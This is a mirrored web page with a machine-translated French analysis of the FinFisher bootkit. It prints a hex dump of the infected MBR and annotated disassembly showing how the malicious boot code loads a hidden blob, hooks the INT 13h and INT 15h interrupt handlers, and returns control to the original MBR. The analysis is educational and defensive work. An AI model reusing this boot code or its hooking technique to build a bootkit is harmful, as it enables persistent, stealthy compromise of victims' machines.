<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëæ ü§≥üèø ‚õé Analyse FinFisher Butkit üëâ ‚è≤Ô∏è üë®‚Äçüë©‚Äçüëß‚Äçüë¶</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Bonsoir Exactement une semaine plus tard, le cours d' ing√©nierie inverse commencera avec nous, et aujourd'hui, nous voulons partager avec vous une tra...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Analyse FinFisher Butkit</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/441970/">  Bonsoir  Exactement une semaine plus tard, le cours d' <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ing√©nierie inverse</a> commencera avec nous, et aujourd'hui, nous voulons partager avec vous une traduction de mat√©riel directement li√© √† ce cours.  Allons-y. <br><br>  Nous avons r√©cemment <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">examin√© le</a> bootkit de malware FinFisher publi√© par <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">WikiLeaks</a> .  La plupart des composants de la version Windows √©taient assez simples, alors passons au pilote en mode noyau et au code de d√©marrage. <br><br><img src="https://habrastorage.org/webt/kg/jt/3o/kgjt3ozk7ugr29_-fpj84jwekmw.png"><br><br>  Le pilote en mode noyau lit directement les donn√©es brutes du disque dur ou les y √©crit.  Une version simplifi√©e de la m√©thode utilis√©e par le pilote peut √™tre trouv√©e dans <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">cet article.</a> <br><a name="habracut"></a><br>  Le programme malveillant cr√©e une copie de l'enregistrement de d√©marrage principal (abr√©g√© en MBR) et l'enregistre s√©par√©ment sur le disque dur.  De plus, le programme √©crit 0x2A00 octets de donn√©es sur le disque dur infect√©.  Ils sont ensuite copi√©s par un code de d√©marrage malveillant.  L'adresse du premier secteur contenant ces donn√©es est cod√©e en dur dans le code de d√©marrage.  Pour trouver leur emplacement physique, le logiciel malveillant utilise l'adressage de bloc logique (LBA). <br>  Sur la machine de test, le MBR a √©t√© remplac√© par les donn√©es suivantes: <br><br><pre><code class="bash hljs">f9fef780 fa 31 c0 8e c0 8e d8 8e d0 bc <span class="hljs-built_in"><span class="hljs-built_in">fc</span></span> ff fb 88 16 34 .1.............4 f9fef790 7c 68 00 00 68 37 7c cb 18 a7 3f 01 00 00 00 00 |h..h7|...?..... f9fef7a0 15 00 00 00 2e a7 3f 01 00 00 00 00 89 c0 89 c9 ......?......... f9fef7b0 89 d2 31 02 00 00 00 b4 41 bb aa 55 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 72 11 ..1.....A..U..r. f9fef7c0 81 fb 55 aa 75 0b f7 c1 01 00 74 05 c6 06 36 7c ..Uu....t...6| f9fef7d0 01 8a 16 34 7c b4 08 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 88 c8 24 3f a2 c2 7c ...4|......$?..| f9fef7e0 88 e8 88 cc c0 ec 06 40 a3 c3 7c 30 f6 fe c2 89 .......@..|0.... f9fef7f0 16 c5 7c 66 8b 0e 18 7c 66 8b 16 1c 7c b8 00 01 ..|f...|f...|... f9fef800 2d 20 00 8e c0 66 31 db 66 51 8c c0 05 20 00 8e - ...f1.fQ... .. f9fef810 c0 80 3e 36 7c 01 74 06 e8 62 00 e9 03 00 e8 36 ..&gt;6|.t..b.....6 f9fef820 00 66 59 66 81 c1 01 00 00 00 66 81 d2 00 00 00 .fYf......f..... f9fef830 00 66 ff 0e 20 7c 75 d0 8a 16 34 7c ea 00 10 00 .f.. |u...4|.... f9fef840 00 00 00 00 00 00 00 10 00 01 00 00 00 00 00 00 ................ f9fef850 00 00 00 00 00 00 00 8c c0 a3 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 7c 89 1e cb 7c ...........|...| f9fef860 66 89 0e cf 7c 66 89 16 d3 7c 66 52 66 31 d2 8a f...|f...|fRf1.. f9fef870 16 34 7c be c7 7c b4 42 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 66 5a c3 66 52 66 .4|..|.B..fZ.fRf f9fef880 53 66 89 c8 66 31 d2 66 31 db 8a 1e c2 7c 66 f7 Sf..f1.f1....|f. f9fef890 f3 66 42 88 16 c1 7c 66 31 d2 66 31 db 8b 1e c5 .fB...|f1.f1.... f9fef8a0 7c 66 f7 f3 8a 0e c1 7c 88 c5 88 d6 66 5b 8a 16 |f.....|....f[.. f9fef8b0 34 7c b8 01 02 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 66 5a c3 00 00 00 00 00 00 4|.....fZ....... f9fef8c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef930 00 00 00 00 00 00 00 00 65 f7 65 f7 00 00 80 01 ........ee.... f9fef940 01 00 07 fe ff ff 3f 00 00 00 d9 a6 3f 01 00 00 ......?.....?... f9fef950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 aa ..............U.</code> </pre> <br><br>  Une inspection rapide des donn√©es sugg√®re que le logiciel malveillant a chang√© le code de d√©marrage, mais les informations de la table de partition sont rest√©es intactes. <br><br>  <b>Analyse du code de d√©marrage malveillant</b> <br><br>  Examinons plus en d√©tail les parties les plus int√©ressantes du code de d√©marrage.  Tout d'abord, la v√©rification de l'installation du lecteur de disque √©tendu (EDD) est effectu√©e: <br><br><pre> <code class="bash hljs">seg000:0037 B4 41 mov ah, 41h ; <span class="hljs-string"><span class="hljs-string">'A'</span></span> seg000:0039 BB AA 55 mov bx, 55AAh seg000:003C CD 13 int 13h</code> </pre> <br><br>  Le logiciel malveillant d√©finit un indicateur qui indique si l'EDD est d√©fini.  L'indicateur contr√¥le la m√©thode utilis√©e par le logiciel malveillant pour lire les donn√©es du disque dur dans la m√©moire physique: <br><br><pre> <code class="bash hljs">seg000:004C C6 06 36 7C 01 mov byte ptr ds:if_edd_installed, 1 ;7C36h</code> </pre> <br><br>  Ensuite, le malware obtient les param√®tres du disque: <br><br><pre> <code class="bash hljs">seg000:0051 8A 16 34 7C mov dl, ds:7C34h ;drive number, first drive is 0x80 seg000:0055 B4 08 mov ah, 8 seg000:0057 CD 13 int 13h</code> </pre><br><br>  Pour le moment, le programme a collect√© suffisamment d'informations pour copier un blob malveillant de 0x2A00 octets du disque dur vers la m√©moire physique.  Un blob de donn√©es est copi√© dans un secteur √† la fois.  Le code ci-dessous est la boucle utilis√©e par le malware pour copier le code: <br><br><pre> <code class="bash hljs">seg000:0091 80 3E 36 7C 01 cmp byte ptr ds:if_edd_installed, 1 seg000:0096 74 06 jz short loc_9E seg000:0098 E8 62 00 call read_data_method_no_edd_installed seg000:009B E9 03 00 jmp loc_A1 seg000:009E ; --------------------------------------------------------------------------- seg000:009E seg000:009E loc_9E: seg000:009E E8 36 00 call read_data_method_edd_installed seg000:00A1 seg000:00A1 loc_A1: seg000:00A1 66 59 pop ecx seg000:00A3 66 81 C1 01 00 00 00 add ecx, 1 seg000:00AA 66 81 D2 00 00 00 00 adc edx, 0 seg000:00B1 66 FF 0E 20 7C dec dword ptr ds:7C20h ;0x0015 seg000:00B6 75 D0 jnz short loc_88</code> </pre> <br><br>  Voici le code de la fonction utilis√©e pour copier des donn√©es lors de l'installation d'EDD: <br><br><pre> <code class="bash hljs">BOOT_SECTOR:7CD7 8C C0 mov ax, es BOOT_SECTOR:7CD9 A3 CD 7C mov word_7CCD, ax BOOT_SECTOR:7CDC 89 1E CB 7C mov word_7CCB, bx BOOT_SECTOR:7CE0 66 89 0E CF 7C mov dword_7CCF, ecx BOOT_SECTOR:7CE5 66 89 16 D3 7C mov dword_7CD3, edx BOOT_SECTOR:7CEA 66 52 push edx BOOT_SECTOR:7CEC 66 31 D2 xor edx, edx BOOT_SECTOR:7CEF 8A 16 34 7C mov dl, byte_7C34 BOOT_SECTOR:7CF3 BE C7 7C mov si, 7CC7h BOOT_SECTOR:7CF6 B4 42 mov ah, 42h ; <span class="hljs-string"><span class="hljs-string">'B'</span></span> BOOT_SECTOR:7CF8 CD 13 int 13h ; DISK - IBM/MS Extension - EXTENDED READ (DL - drive, DS:SI - disk address packet)</code> </pre> <br><br>  Dans cet exemple, avant d'appeler INT 13h pour copier le premier secteur de donn√©es malveillantes dans la m√©moire physique de la machine de test, nous avons les arguments suivants: <br><br><pre> <code class="bash hljs"> 0x0000000000007cc7 &lt;bogus+ 0&gt;: 0x0010 0x0001 0x0000 0x0100 0xa718 0x013f 0x0000 0x0000 +0: 0x10 - packet size +2: 0x1 - number of sectors +4: 0x0000 - offset +6: 0x1000 - segment +8: 0x013fa718 - LBA</code> </pre> <br><br>  Une fois que le malware a fini de copier les donn√©es, il va dans le code copi√© et continue son ex√©cution l√†-bas: <br><br><pre> <code class="bash hljs">seg000:00B8 8A 16 34 7C mov dl, ds:7C34h ;0x0000 seg000:00BC EA 00 10 00 00 jmp far ptr 0:1000h</code> </pre><br><br>  Le code en 0x1000 est la partie la plus int√©ressante du programme.  Mais avant de poursuivre l'analyse, il convient de rappeler que le bootkit FinFisher fonctionne en mode r√©el.  Ceci est diff√©rent du mode prot√©g√©.  L'une des diff√©rences est que vous devez calculer les adresses physiques en utilisant une combinaison de registres es: di et ds: si. <br>  La formule de calcul de l'adresse physique est (segment * 0x10) + d√©calage.  Par exemple, si nous regardons la paire es: di, alors es est le segment et di est le d√©calage.  Toutes les adresses ci-dessous sont calcul√©es √† l'aide de cette formule. <br>  Examinons maintenant la partie la plus int√©ressante du code.  Premi√®rement, le malware calcule l'adresse du segment √† partir duquel les donn√©es sont copi√©es (c'est la deuxi√®me fois que le blob de donn√©es est copi√©): <br><br><pre> <code class="bash hljs">seg000:0024 88 16 1B 00 mov ds:1Bh, dl seg000:0028 BE 13 04 mov si, 413h seg000:002B 26 8B 04 mov ax, es:[si] seg000:002E 66 0F B7 C0 movzx eax, ax seg000:0032 66 C1 E0 0A shl eax, 0Ah seg000:0036 66 2D C2 28 00 00 sub eax, 28C2h ;before the segment address is stored: ;&lt;bochs:148&gt; x /1hw 0x101c ;[bochs]:0x000000000000101c &lt;bogus+ 0&gt;: 0x00000000 seg000:003C 66 A3 1C 00 mov ds:1Ch, eax ;ds = 0x0100, ds:1ch = hex((0x0100* 0x10) + 0x1c) = 0x101c ;after the segment address is stored: ;&lt;bochs:150&gt; x /1hw 0x101c ;[bochs]:0x000000000000101c &lt;bogus+ 0&gt;: 0x0009d33e</code> </pre> <br><br>  Ensuite, le programme d√©finit des hooks pour les gestionnaires INT 13h et INT 15h.  Comme vous pouvez le voir dans le code ci-dessus, le programme malveillant ne donne pas de nouvelles id√©es sur la fa√ßon d'intercepter les gestionnaires d'interruption de bas niveau: <br><br><pre> <code class="bash hljs">seg000:0040 66 50 push eax seg000:0042 66 C1 E8 0A shr eax, 0Ah seg000:0046 26 89 04 mov es:[si], ax ;es=0x0000, si = 0x0413 ;before: &lt;bochs:156&gt; x /1hw 0x413 [bochs]: 0x0000000000000413 &lt;bogus+ 0&gt;: 0x0000027f ;after: ;&lt;bochs:158&gt; x /1hw 0x413 [bochs]: 0x0000000000000413 &lt;bogus+ 0&gt;: 0x00000274 seg000:0049 66 58 pop eax seg000:004B seg000:004B loc_4B: seg000:004B seg000:004B 66 C1 E8 04 shr eax, 4 seg000:004F A3 22 00 mov ds:22h, ax ;ax = 0x9d33 ;after: ;&lt;bochs:167&gt; x /1hh 0x1022 [bochs]: 0x0000000000001022 &lt;bogus+ 0&gt;: 0x9d33 seg000:0052 FA cli seg000:0053 loc_53: seg000:0053 8C D8 mov ax, ds seg000:0055 8E C0 mov es, ax seg000:0057 66 B8 20 E8 00 00 mov eax, 0E820h ;get system memory map seg000:005D 66 BA 50 41 4D 53 mov edx, 534D4150h ;<span class="hljs-string"><span class="hljs-string">"SMAP"</span></span> seg000:0063 66 31 DB xor ebx, ebx ;start at the beginning of the map. seg000:0066 66 31 FF xor edi, edi seg000:0069 BF 26 01 mov di, 126h ;es:di buffer that gets the result. ;es = 0x100, di = 0x0126 seg000:006C 26 66 C7 45 14 01 00 00+ mov dword ptr es:[di+14h], 1 seg000:0075 66 B9 18 00 00 00 mov ecx, 18h ;size of the buffer. seg000:007B CD 15 int 15h ;BIOS Memory Services seg000:007D 72 34 jb short loc_B3 seg000:007F 66 3D 50 41 4D 53 cmp eax, 534D4150h ;check <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">"SMAP"</span></span> seg000:0085 75 2C jnz short loc_B3 seg000:0087 66 85 DB <span class="hljs-built_in"><span class="hljs-built_in">test</span></span> ebx, ebx seg000:008A 74 27 jz short loc_B3 seg000:008C db 3Eh seg000:008C 3E 66 89 1E F2 02 mov ds:2F2h, ebx ;holds continuation value ;ds = 0x100, physical address 0x12f2 seg000:0092 66 31 C0 xor eax, eax seg000:0095 8E C0 mov es, ax seg000:0097 assume es:nothing seg000:0097 26 66 A1 54 00 mov eax, dword ptr es:int_15_h ;IVTABLE:0054 seg000:009C db 3Eh ;debug001:12EE 00 00 00 00 dword_12EE dd 0 ;debug001:12F2 01 00 00 00 dword_12F2 dd 1 seg000:009C 3E 66 A3 EE 02 mov ds:2EEh, eax ;debug001:12EE 59 F8 00 F0 dword_12EE dd 0F000F859h ;debug001:12F2 01 00 00 00 dword_12F2 dd 1 seg000:00A1 A1 22 00 mov ax, ds:22h ;segment_hook ;previously calculated value 0x9d33 seg000:00A4 66 C1 E0 10 shl eax, 10h seg000:00A8 66 05 42 01 00 00 add eax, 142h ;before hook is installed: IVTABLE:004C FE E3 00 F0 dword_4C dd 0F000E3FEh IVTABLE:004C IVTABLE:0050 39 E7 word_50 dw 0E739h IVTABLE:0052 00 F0 word_52 dw 0F000h IVTABLE:0054 59 F8 00 F0 dword_54 dd 0F000F859h IVTABLE:0054 seg000:00AE 26 66 A3 54 00 mov dword ptr es:int_15_h, eax ;hooks INT15h ;&lt;bochs:206&gt; x /1hw 0x54 [bochs]: 0x0000000000000054 &lt;bogus+ 0&gt;: 0x9d330142 ;IVTABLE:0054 42 01 word_54 dw 142h ;offset ;IVTABLE:0056 33 9D dw 9D33h ;segment seg000:00B3 loc_B3: seg000:00B3 66 31 C0 xor eax, eax seg000:00B6 8E C0 mov es, ax seg000:00B8 26 66 A1 4C 00 mov eax, dword ptr es:int_13_h ;before: ;debug001:11D4 00 00 00 00 int_13_original dd 0 ;after: ;debug001:11D4 FE E3 00 F0 int_13_original dd 0F000E3FEh seg000:00BD db 3Eh seg000:00BD 3E 66 A3 D4 01 mov ds:1D4h, eax ;debug001:11CC FE E3 00 F0 int_13_original_1 dd 0F000E3FEh seg000:00C2 3E 66 A3 CC 01 mov ds:1CCh, eax seg000:00C7 A1 22 00 mov ax, ds:22h ;0x9d33 seg000:00CA 66 C1 E0 10 shl eax, 10h seg000:00CE db 3Eh seg000:00CE 3E 66 A3 51 02 mov ds:251h, eax ;before: ;debug001:1251 00 00 00 00 hook_segment dd 0 ;after: ;debug001:1251 00 00 33 9D hook_segment dd 9D330000h seg000:00D3 66 05 12 01 00 00 add eax, 112h seg000:00D9 26 66 A3 4C 00 mov dword ptr es:loc_4B+1, eax ;hooks INT13h ;es = 0x00 eax = 0x112 ;IVT after both INT 13h and INT 15h hooks are installed: IVTABLE:004C 12 01 int_13_h dw 112h ; offset IVTABLE:004E 33 9D dw 9D33h ; segment IVTABLE:0050 39 E7 word_50 dw 0E739h IVTABLE:0052 00 F0 word_52 dw 0F000h IVTABLE:0054 42 01 int_15_h dw 142h ; offset IVTABLE:0056 33 9D dw 9D33h ; segment</code> </pre> <br><br>  Maintenant, les hooks sont d√©finis pour INT 13h et INT 15h, mais le code des fonctions qui hookent des INT n'a pas encore √©t√© copi√© dans le segment calcul√©.  √âvidemment, l'√©tape suivante consiste √† copier le code des gestionnaires intercept√©s: <br><br><pre> <code class="bash hljs">seg000:00DE A1 22 00 mov ax, ds:22h seg000:00E1 8E C0 mov es, ax seg000:00E3 31 FF xor di, di seg000:00E5 B9 C2 28 mov cx, 28C2h seg000:00E8 FC cld seg000:00E9 BE 3E 01 mov si, 13Eh seg000:00EC F3 A4 rep movsb ;si = 0x013e - <span class="hljs-built_in"><span class="hljs-built_in">source</span></span> of the data to be copied. ;di = 0x0000 - destination ;cx = 0x28c2 - number of bytes to be copied. ;ds = 0x0100, es = 0x9d33 ;the actual physical addresses of the <span class="hljs-built_in"><span class="hljs-built_in">source</span></span> is ds:[si] = ;hex((0x0100 * 0x10) + 0x13e) = 0x113e ;the physical address of the destination is es:[di] = ;hex((0x9dd3 * 0x10) + 0x0000) = 0x9dd30 ;copies all the data copied <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> the first stage except <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> the first 0x13e bytes. ;hex(0x2a00-0x28c2) = 0x13e</code> </pre> <br><br>  Le logiciel malveillant est maintenant pr√™t √† reprendre le contr√¥le du MBR d'origine, mais tout d'abord, il doit restaurer le MBR √† 0x7C00 (le secteur dans lequel se trouve la copie du MBR d'origine est stock√© √† un autre endroit sur le disque dur), puis transf√©rer l'ex√©cution du MBR d'origine. <br><br><pre> <code class="bash hljs">seg000:00EE FB sti seg000:00EF 66 8B 0E 13 00 mov ecx, ds:13h seg000:00F4 66 8B 16 17 00 mov edx, ds:17h seg000:00F9 66 89 0E 1E 01 mov ds:11Eh, ecx seg000:00FE 66 89 16 22 01 mov ds:122h, edx seg000:0103 BE 16 01 mov si, 116h ;buffer ;ds = 0x0100, address 0x1116 seg000:0106 BB AA 55 mov bx, 55AAh seg000:0109 8A 16 1B 00 mov dl, ds:1Bh ;drive number here 0x80 seg000:010D B4 42 mov ah, 42h ; <span class="hljs-string"><span class="hljs-string">'B'</span></span> seg000:010F CD 13 int 13h ;DISK - IBM/MS Extension - EXTENDED READ (DL - drive, DS:SI - disk address packet) ;INT 13h is hooked now ;debug003:0112 EA 00 00 33 9D jmp far ptr loc_9D330 ;&lt;bochs:267&gt; x /10hh 0x1116 [bochs]: 0x0000000000001116 &lt;bogus+ 0&gt;: 0x0010 0x0001 0x7c00 0x0000 0xa72d 0x013f 0x 0000 0x0000 0x0000000000001126 &lt;bogus+ 16&gt;: 0x0000 0x0000 size of the packet 0x0010 number of blocks to transfer = 0x0001 destination 0x7c00 LBA: 0x013fa7d2 ;Jumps to the original MBR here: seg000:0111 EA 00 7C 00 00 jmp far ptr 0:7C00h</code> </pre> <br><br>  <b>Ce que nous avons appris du kit de d√©marrage FinFisher</b> <br><br>  Cet exemple de bootkit FinFisher n'offre pas de nouvelles techniques ou am√©liorations par rapport aux autres bootkits.  Les cr√©ateurs de logiciels malveillants ont d√©cid√© de d√©finir des hooks pour les gestionnaires INT 13h et INT 15h avant que le code de ces gestionnaires ne soit copi√© en m√©moire;  ce qui pourrait √™tre d√©sastreux.  Par exemple, si le code des fonctions de gestionnaire intercept√©es ne peut pas √™tre copi√©, un plantage du syst√®me peut se produire. <br><br>  Traditionnellement, nous attendons vos commentaires et nous invitons tout le monde √† une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">journ√©e portes ouvertes</a> , qui se tiendra demain. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr441970/">https://habr.com/ru/post/fr441970/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr441956/index.html">Gestion des erreurs unifi√©e (option C ++ pour microcontr√¥leurs)</a></li>
<li><a href="../fr441962/index.html">Index dans PostgreSQL - 1</a></li>
<li><a href="../fr441964/index.html">Trucs et astuces Kubernetes: d√©placement des ressources de cluster vers Helm 2</a></li>
<li><a href="../fr441966/index.html">Kit de d√©marrage des tests de s√©curit√© Web</a></li>
<li><a href="../fr441968/index.html">D√©veloppement d'une nouvelle branche produit: comment se d√©barrasser de l'impraticable et rester utile</a></li>
<li><a href="../fr441972/index.html">Invidious - Frontend YouTube alternatif</a></li>
<li><a href="../fr441974/index.html">Le chemin de l'historien des programmeurs RH aux programmeurs Java: un peu de chance et de pers√©v√©rance</a></li>
<li><a href="../fr441976/index.html">Avec vous FizTech.Science: nous recherchons des param√®tres cach√©s et plongons dans le merveilleux monde quantique</a></li>
<li><a href="../fr441978/index.html">Test fonctionnel des comp√©tences de Yandex Alice sur Node.js</a></li>
<li><a href="../fr441980/index.html">Les scientifiques ont identifi√© les lacunes de l'interface Windows Update, qui est partiellement con√ßue pour les "utilisateurs stupides"</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>